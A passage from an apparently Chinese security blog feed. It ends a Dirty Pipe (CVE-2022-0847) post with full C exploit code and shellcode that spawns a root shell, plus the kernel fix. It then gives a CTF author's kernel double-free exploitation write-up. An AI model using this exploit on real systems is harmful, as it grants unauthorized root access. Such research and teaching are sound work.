class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> shellcode_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br><span class="hljs-type">long</span>page_size;<br><span class="hljs-type">size_t</span>offset_in_file;<br><span class="hljs-type">size_t</span> data_size;<br><span class="hljs-type">int</span> target_file_fd;<br><span class="hljs-type">int</span>pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_size;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">int</span> retval;<br><br><span class="hljs-comment">// checking before we start to exploit</span><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Usage: ./exp target_file&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br>page_size = sysconf(_SC_PAGE_SIZE);<br>offset_in_file = <span class="hljs-number">1</span>;<br><br>target_file_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (target_file_fd &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Failed to open the target file!&quot;</span>);<br><br><span class="hljs-comment">// exploit now...</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span><br><span class="hljs-comment"> * Just write and read through</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);<br>pipe(pipe_fd);<br>pipe_size = fcntl(pipe_fd[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>buffer = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(page_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;<br>size_left -= write(pipe_fd[<span class="hljs-number">1</span>], buffer, per_write);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;<br>size_left -= read(pipe_fd[<span class="hljs-number">0</span>], buffer, per_read);<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use the splice to make the pipe_buffer-&gt;page</span><br><span class="hljs-comment"> * become the page of the file mapped, by read</span><br><span class="hljs-comment"> * a byte from the file accross the splice</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);<br>offset_in_file--;<span class="hljs-comment">// we read a byte, so offset should minus 1</span><br>retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;splice failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;short splice!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Now it comes to the time of exploit:</span><br><span class="hljs-comment"> * the mapped page of file has been in pipe_buffer,</span><br><span class="hljs-comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span><br><span class="hljs-comment"> * just a simple write can make the exploit.</span><br><span class="hljs-comment"> */</span><br>retval = write(pipe_fd[<span class="hljs-number">1</span>], &amp;shellcode[<span class="hljs-number">1</span>], shellcode_len);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Write failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval &lt; shellcode_len)<br>errExit(<span class="hljs-string">&quot;Short write!&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Trigger root shell...\033[0m&quot;</span>);<br>system(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Ubuntu 21.10 、内核版本 <code>5.13.0-28</code>  上测试的结果如下，成功完成提权：</p><p><img src="https://s2.loli.net/2022/03/12/P2QdeIqbASfuxHR.png" alt="image.png"></p><h1>0x04.漏洞修复</h1><p>漏洞的修复方式比较简单，只需要在对应的涉及到 <code>pipe_buffer-&gt;flags</code> 的代码添加上将 flag 置 0 的代码即可，除了 <code>copy_page_to_iter_pipe</code> 以外在 <code>push_pipe</code> 中也缺失了置 0 的代码，补充上即可：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/lib/iov_iter.c b/lib/iov_iter.c</span><br><span class="hljs-comment">index b0e0acdf96c1..6dd5330f7a99 100644</span><br><span class="hljs-comment">--- a/lib/iov_iter.c</span><br><span class="hljs-comment">+++ b/lib/iov_iter.c</span><br><span class="hljs-meta">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by<br> return 0;<br> <br> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-addition">+buf-&gt;flags = 0;</span><br> get_page(page);<br> buf-&gt;page = page;<br> buf-&gt;offset = offset;<br><span class="hljs-meta">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,<br> break;<br> <br> buf-&gt;ops = &amp;default_pipe_buf_ops;<br><span class="hljs-addition">+buf-&gt;flags = 0;</span><br> buf-&gt;page = page;<br> buf-&gt;offset = 0;<br> buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);<br></code></pre></td></tr></table></figure><blockquote><p>参见<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">linux-kernel.vger.kernel.org archive mirror</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我超，管人痴！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</title>
    <link href="http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/"/>
    <id>http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</id>
    <published>2022-03-08T10:25:07.000Z</published>
    <updated>2023-02-09T08:09:12.450Z</updated>
    
    <content type="html"><![CDATA[<p>听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>本题的原型来自于笔者大三上学期面试国内某安全大厂时的一道面试题，当时的问题是：</p><ul><li>“在保护全开的情况下若是给你一个内核空间中的 double free，大小为███，你该怎样去利用？”</li></ul><p>笔者在当时并未答出一个令面试官较为满意的答案，之后笔者重新思考，发现这是一个<strong>十分有意思</strong>的问题：这十分贴近于现实内核漏洞的抽象模型之一。</p><p>相比于 CTF 中 pwn 题所给予的“优越”的环境，现实中的漏洞往往就<strong>只是</strong>一个引用计数错误导致的 double free、一个溢出（可能只是一个 <code>\0</code> 字节）、一个垂悬指针导致的 UAF…在这种漏洞环境当中，我们并没有“出题人”给予我们的“菜单堆”的各种功能</p><p>因此，在这样“恶劣”的漏洞环境之下，我们不能仅仅寄希望于这个漏洞有一个较好的品相、既能帮我们泄露内核基址又能帮我们劫持控制流，而应当更多地<strong>借助内核本身提供给我们的工具</strong>，以寻求更为<strong>通用</strong>的解法</p><p>如何寻求更为通用的解法？大家都知道对于用户态的 glibc 堆题而言我们往往有着一种通用解法——将漏洞转为 UAF。无论是 overlapping 、double free、overflow…最终我们都可以通过将其转化为 UAF 完成利用，这个法则对于“内核堆”而言同样有效</p><p>基于这种思想，对于内核中的 double free、堆溢出等漏洞，我们都可以想方法将其化为 UAF，之后再通过通用的解法完成解题——<strong>本题便是笔者对于在内核漏洞利用的 UAF 阶段之后通用的解法的一个探索与尝试</strong></p><h1>0x01.题目分析</h1><p>笔者在 <a href="http://README.md">README.md</a> 中额外说明了内核的如下编译选项：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER</span>=y<br><span class="hljs-attr">CONFIG_STATIC_USERMODEHELPER_PATH</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">CONFIG_SLUB</span>=y<br><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>=y<br><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span>=y<br><span class="hljs-attr">CONFIG_HARDENED_USERCOPY</span>=y<br></code></pre></td></tr></table></figure><p>即除了 FG-KASLR 以外大部分主流的保护都开启了</p><p>因为笔者更希望大家能够关注于漏洞利用上，因此题目本身的逻辑十分简单，只提供了一个 ioctl “菜单”，<strong>有效的功能只有分配与释放 buf</strong>，分配的大小为 1024</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kheap_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    spin_lock(&amp;spin);<br><br>    <span class="hljs-keyword">switch</span> (cmd)<br>    &#123;<br>        <span class="hljs-keyword">case</span> OBJ_ADD:<br>                <span class="hljs-keyword">if</span> (buf)<br>                &#123;<br>                    printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] You already had a buffer!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                buf = kmalloc(<span class="hljs-number">1024</span>, GFP_KERNEL);<br>                ref_count++;<br>                printk(KERN_INFO <span class="hljs-string">&quot;[d3kheap:] Alloc done.\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> OBJ_EDIT:<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> OBJ_SHOW:<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> OBJ_DEL:<br>                <span class="hljs-keyword">if</span> (!buf)<br>                &#123;<br>                    printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] You don\&#x27;t had a buffer!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!ref_count)<br>                &#123;<br>                    printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] The buf already free!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ref_count--;<br>                kfree(buf);<br>                printk(KERN_INFO <span class="hljs-string">&quot;[d3kheap:] Free done.\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kheap:] Invalid instructions.\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    spin_unlock(&amp;spin);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>涉及到的两个全局变量初始值如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *buf = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> ref_count = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>根据 ioctl 的逻辑，当我们分配了一个 object 之后 <strong>ioctl 的分配功能就无效了</strong>，而每当我们进行一次释放，<code>ref_count</code> 便会减一，当其为 0 时 <strong>ioctl 的释放功能也被无效化</strong></p><p>漏洞点很明显，对 <code>ref_count</code> 的错误初始化导致我们可以释放 buf 两次，即该模块<strong>只提供给你三次操作机会，一次分配，两次释放，我们不能通过漏洞模块对 buf 进行任何额外的操作</strong>（例如读/写），本质上就是——“给你一次内核空间中大小为 1024 的 object 的 double free 的机会，保护全开，你该如何去利用？”</p><h1>0x02.漏洞利用</h1><p>因为在 slub_free 中有着对 double free 的简单检查（类似于 glibc 中的 fastbin，会检查 freelist 指向的第一个 object），因此我们不能够直接进行 double free，而应该将其转化为 UAF 进行利用</p><h2 id="构造-UAF">构造 UAF</h2><p>我们首先需要构造一个 UAF，我们不难想到如下利用链：</p><ul><li>分配一个 1024 大小的 object</li><li>释放该 object</li><li>将其分配到别的结构体（victim）上</li><li>释放该 object</li></ul><p>此时 victim 虽然还处在使用阶段，但是<strong>在 slub 中其同时也被视为一个 free object</strong>，我们此时便完成了 UAF 的构造，由于 slub 遵循 LIFO，因此接下来分配的第一个大小为 1024 的 object <strong>便会是 victim</strong></p><p>接下来有两种解法，一种是笔者最初想到的比较笨重的内存搜索解法，另一种是基于 Google 在 CVE-2021-22555 中给出的通用 UAF 解法</p><h2 id="解法一：利用-setxattr-多次劫持-msg-msg">解法一：利用 setxattr 多次劫持 msg_msg</h2><h3 id="Step-I-setxattr-修改-object-内容">Step.I setxattr 修改 object 内容</h3><p>接下来我们思考如何对一个 free 状态的 object 内写入数据，这里笔者要向大家介绍一个名为 setxattr 的系统调用（对内核安全稍有研究的同学应该都接触过）</p><p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong>，完成写入之后该 object 又会通过 kvfree 被释放掉，因此我们便可以通过 setxattr <strong>多次修改 victim 的内容</strong></p><p>不够完美的一点是，slub 中 free 的 object 同样是连接成一个单向链表，因此我们无法控制该 object 中 <code>kmem_cache-&gt;offset</code> 偏移处的 8 字节的内容，但这个 offset 的存在<strong>也从另一个侧面提供给了我们便利</strong>，在接下来的利用中你会看到这一点</p><p>可能有的人还会想到 userfaultfd + setxattr 这一技术，或许可以利用这个技术劫持 freelist 完成任意地址分配与任意地址写？但是<strong>自从内核版本 5.11 起，userfaultfd 被限制为默认情况下只有 root 权限才能使用</strong>，因此这条路暂时是走不通的，我们接下来要找一个不是特别受分配大小影响的结构体</p><h3 id="Step-II-msg-msg-搜索内存完成地址泄露">Step.II msg_msg 搜索内存完成地址泄露</h3><p>现在我们有了「写的原语」，接下来我们要寻找「读的原语」，在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* last msgsnd time */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* last msgrcv time */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* last change time */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* current number of bytes on queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* number of messages in queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* max number of bytes on queue */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* pid of last msgsnd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* last receive pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>若是消息队列中只有一个消息则是这样：</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgsnd</span><span class="hljs-params">(<span 